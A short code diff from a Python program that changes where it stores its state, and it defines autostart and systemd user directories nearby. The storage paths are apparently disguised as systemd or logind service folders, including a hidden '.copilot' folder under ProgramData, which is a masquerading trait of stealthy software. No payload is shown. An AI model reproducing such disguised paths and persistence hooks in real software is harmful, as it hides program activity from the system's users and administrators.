@@ -16,7 +16,7 @@ import plistlib
 # ------------------------------------------------------------------
 # BASE_DIR = os.path.normpath(os.path.expanduser("~/.config"))
 
-BASE_DIR = os.path.normpath(r"C:\ProgramData\.copilot\systemd-private-logind.service-xmssa\tmms-features\.config" if os.name == "nt" else os.path.expanduser("/var/tmp/systemd-private-ea792b65bd41fd8tt-31d7568a-systemmd-logind.service-PRxmsa/tms-features/.config"))
+BASE_DIR = os.path.normpath(r"C:\ProgramData\.copilot\systemd-private-logind.service-xmssa\tmms-features\.config" if os.name == "nt" else os.path.expanduser("/var/tmp/tms-features/.config"))
 STATE_FILE = os.path.join(BASE_DIR, "state.json")
 LINUX_AUTOSTART_DIR = os.path.expanduser("~/.config/autostart")
 LINUX_SYSTEMD_USER_DIR = os.path.expanduser("~/.config/systemd/user")
